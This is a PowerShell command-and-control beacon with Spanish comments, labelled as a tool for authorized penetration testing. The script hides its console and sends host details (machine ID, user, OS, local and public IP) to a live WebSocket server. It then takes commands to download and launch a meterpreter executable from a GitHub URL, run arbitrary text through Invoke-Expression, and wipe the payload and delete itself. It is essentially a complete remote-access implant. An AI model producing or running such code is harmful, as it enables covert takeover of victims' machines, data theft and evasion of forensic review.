# Beacon C2 para pentesting autorizado (Windows, solo .NET, sin dependencias).
# Ejecutar:  powershell -ExecutionPolicy Bypass -File beacon.ps1
# Oculta la consola y envia info detallada del equipo al C2 al conectarse.

# --- Ocultar la ventana de consola (Win32) ---
try {
    Add-Type -Namespace Win32 -Name Native -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@ -ErrorAction Stop
    [Win32.Native]::ShowWindow([Win32.Native]::GetConsoleWindow(), 0) | Out-Null
} catch {}

$C2_URL          = "wss://c2-render.onrender.com"
$METERPRETER_URL = "https://github.com/R0b0tik0/shell/raw/refs/heads/main/meterpreter.exe"
$PAYLOAD_PATH    = "$env:windir\temp\Cache\meterpreter.exe"
$LOG_PATH        = "$env:windir\temp\Cache\beacon.log"
$RETRY_SECONDS   = 15

# --- ID estable del equipo: MachineGuid del registro, o GUID guardado en disco ---
# El servidor lo usa para distinguir un dispositivo NUEVO de una simple reconexion.
$DEVICE_ID = $null
try { $DEVICE_ID = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid -ErrorAction Stop).MachineGuid } catch {}
if (-not $DEVICE_ID) {
    $ID_FILE = "$env:windir\temp\Cache\device.id"
    try {
        if (Test-Path $ID_FILE) { $DEVICE_ID = (Get-Content $ID_FILE -Raw).Trim() }
    } catch {}
    if (-not $DEVICE_ID) {
        try {
            New-Item -ItemType Directory -Force -Path (Split-Path $ID_FILE) | Out-Null
            $DEVICE_ID = [guid]::NewGuid().ToString()
            Set-Content -Path $ID_FILE -Value $DEVICE_ID -Encoding ASCII
        } catch { $DEVICE_ID = "anon-$([guid]::NewGuid().ToString())" }
    }
}

# --- Log a consola (si es visible) y a archivo ---
function Write-Log([string]$msg) {
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $msg"
    try { Add-Content -Path $LOG_PATH -Value $line -Encoding UTF8 } catch {}
    Write-Host $line
}

# --- IP real del equipo ---
# LAN: IP del adaptador con puerta de enlace por defecto (el que sale a Internet),
# descartando adaptadores virtuales (VPN, Hyper-V, WSL, Docker, etc.).
$script:PublicIP = $null
function Get-RealIP {
    # 1) Adaptador principal: el que tiene gateway por defecto.
    try {
        $bad = 'loopback|virtual|vEthernet|hyper-v|wsl|vmware|virtualbox|docker|bluetooth|tunnel|tap|tailscale'
        $ips = @(Get-NetIPConfiguration -ErrorAction Stop |
            Where-Object {
                $_.IPv4DefaultGateway -and
                $_.NetAdapter.Status -eq 'Up' -and
                $_.NetAdapter.InterfaceDescription -notmatch $bad
            } |
            ForEach-Object { $_.IPv4Address } |
            Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254.*' } |
            Select-Object -ExpandProperty IPAddress)
        if ($ips) { return ($ips -join ',') }
    } catch {}
    # 2) Fallback: Get-NetIPAddress excluyendo adaptadores virtuales por nombre.
    try {
        $bad = 'loopback|virtual|vEthernet|hyper-v|wsl|vmware|virtualbox|docker|bluetooth|tunnel|tap|tailscale'
        $ips = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
            Where-Object {
                $_.IPAddress -ne '127.0.0.1' -and
                $_.IPAddress -notlike '169.254.*' -and
                "$($_.InterfaceAlias) $($_.InterfaceDescription)" -notmatch $bad
            } |
            Select-Object -ExpandProperty IPAddress)
        if ($ips) { return ($ips -join ',') }
    } catch {}
    # 3) Ultimo recurso: DNS del hostname.
    try {
        $ips = @([System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) |
            Where-Object { $_.AddressFamily -eq 'InterNetwork' -and $_.IPAddressToString -ne '127.0.0.1' } |
            ForEach-Object { $_.IPAddressToString })
        if ($ips) { return ($ips -join ',') }
    } catch {}
    return "sin IP"
}

# IP publica (WAN) vista desde fuera. Se consulta una sola vez y se cachea.
function Get-PublicIP {
    if ($script:PublicIP) { return $script:PublicIP }
    foreach ($svc in @('https://api.ipify.org', 'https://icanhazip.com')) {
        try {
            $ip = (Invoke-WebRequest -Uri $svc -UseBasicParsing -TimeoutSec 5).Content.Trim()
            if ($ip -match '^\d{1,3}(\.\d{1,3}){3}$') { $script:PublicIP = $ip; return $ip }
        } catch {}
    }
    return $null
}

# --- Info detallada del equipo ---
function Get-BeaconInfo {
    $os = "desconocido"; $arch = "desconocido"
    try { $os = [System.Environment]::OSVersion.VersionString } catch {}
    try { $arch = [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture.ToString() } catch {}
    $ip = Get-RealIP
    $info = "id=$DEVICE_ID | equipo=$env:COMPUTERNAME | usuario=$env:USERDOMAIN\$env:USERNAME | os=$os ($arch) | ip=$ip"
    $pub = Get-PublicIP
    if ($pub) { $info += " | pub=$pub" }
    return $info
}

$attempt = 0
while ($true) {
    $attempt++
    $ws = $null
    try {
        $ws  = [System.Net.WebSockets.ClientWebSocket]::new()
        $cts = [System.Threading.CancellationToken]::None

        Write-Log "intento $attempt -> conectando a $C2_URL"
        $null = $ws.ConnectAsync([Uri]$C2_URL, $cts).GetAwaiter().GetResult()

        # Primer mensaje: info del equipo (la veras en los logs del C2).
        $info = Get-BeaconInfo
        Write-Log "conectado: $info"
        $first = [System.Text.Encoding]::UTF8.GetBytes($info)
        $null = $ws.SendAsync([ArraySegment[byte]]::new($first),
            [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts).GetAwaiter().GetResult()

        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            # Leer un mensaje completo (puede venir en varios fragmentos).
            $buffer = [byte[]]::new(8192)
            $ms = [System.IO.MemoryStream]::new()
            do {
                $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($buffer), $cts).GetAwaiter().GetResult()
                $ms.Write($buffer, 0, $result.Count)
            } while (-not $result.EndOfMessage)

            $text = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
            Write-Log "recibido: $text"

            if ($text -like "descargar:*") {
                # Comando: descargar el payload SIN ejecutarlo (boton "Descargar").
                Write-Log "descargando payload ..."
                try {
                    New-Item -ItemType Directory -Force -Path (Split-Path $PAYLOAD_PATH) | Out-Null
                    Invoke-WebRequest -Uri $METERPRETER_URL -OutFile $PAYLOAD_PATH -UseBasicParsing
                    Write-Log "payload descargado: $PAYLOAD_PATH"
                } catch {
                    Write-Log "error descargando payload: $_"
                }
            } elseif ($text -like "conectar:*") {
                # Comando: descargar el payload (si falta) y ejecutarlo contra el tunel (boton "Ejecutar").
                $target = ($text -split "conectar:", 2)[1].Trim()
                Write-Log "preparando payload hacia $target ..."
                try {
                    if (-not (Test-Path $PAYLOAD_PATH)) {
                        New-Item -ItemType Directory -Force -Path (Split-Path $PAYLOAD_PATH) | Out-Null
                        Invoke-WebRequest -Uri $METERPRETER_URL -OutFile $PAYLOAD_PATH -UseBasicParsing
                        Write-Log "payload descargado"
                    }
                    Start-Process -FilePath $PAYLOAD_PATH -ArgumentList $target
                    Write-Log "payload lanzado"
                } catch {
                    Write-Log "error descargando/ejecutando payload: $_"
                }
            } elseif ($text -like "borrar:*") {
                # Comando: eliminar todo rastro (kill meterpreter, borrar cache) y auto-borrarse.
                Write-Log "orden de borrado recibida"
                try {
                    # Matar por nombre y por ruta. OJO: leer $_.Path puede fallar con
                    # procesos protegidos del sistema (access denied) y abortar el pipeline;
                    # por eso cada acceso va en try/catch individual.
                    Stop-Process -Name 'meterpreter' -Force -ErrorAction SilentlyContinue
                    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
                        try {
                            if ($_.Path -eq $PAYLOAD_PATH) {
                                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                            }
                        } catch {}
                    }
                } catch {}
                try { Remove-Item -Path (Split-Path $PAYLOAD_PATH) -Recurse -Force -ErrorAction SilentlyContinue } catch {}
                try { if ($ws) { $ws.Dispose() } } catch {}
                # Auto-borrado con retardo mediante un .bat temporal:
                # el contenido se escribe literal (sin re-citado de argumentos),
                # asi `cmd` recibe el comando exacto. El .bat se borra a si mismo.
                try {
                    $self = $PSCommandPath
                    if (-not $self) { $self = $MyInvocation.MyCommand.Path }
                    if ($self) {
                        $bat = Join-Path $env:TEMP ("cleanup_" + [guid]::NewGuid().ToString('N') + ".bat")
                        @(
                            '@echo off',
                            'timeout /t 2 /nobreak >nul',
                            "del /f /q `"$self`"",
                            "del /f /q `"$bat`""
                        ) | Set-Content -Path $bat -Encoding ASCII
                        Start-Process -FilePath $bat -WindowStyle Hidden
                    }
                } catch { Write-Log "error en auto-borrado: $_" }
                Write-Log "limpieza completada"
                exit
            } else {
                # Cualquier otro texto: ejecucion directa (solo pruebas).
                try {
                    Invoke-Expression $text
                } catch {
                    Write-Log "error ejecutando: $_"
                }
            }
        }
    } catch {
        Write-Log "error de conexion: $_"
    } finally {
        if ($ws) { $ws.Dispose() }
    }
    Write-Log "reintentando en $RETRY_SECONDS s ..."
    Start-Sleep -Seconds $RETRY_SECONDS
}
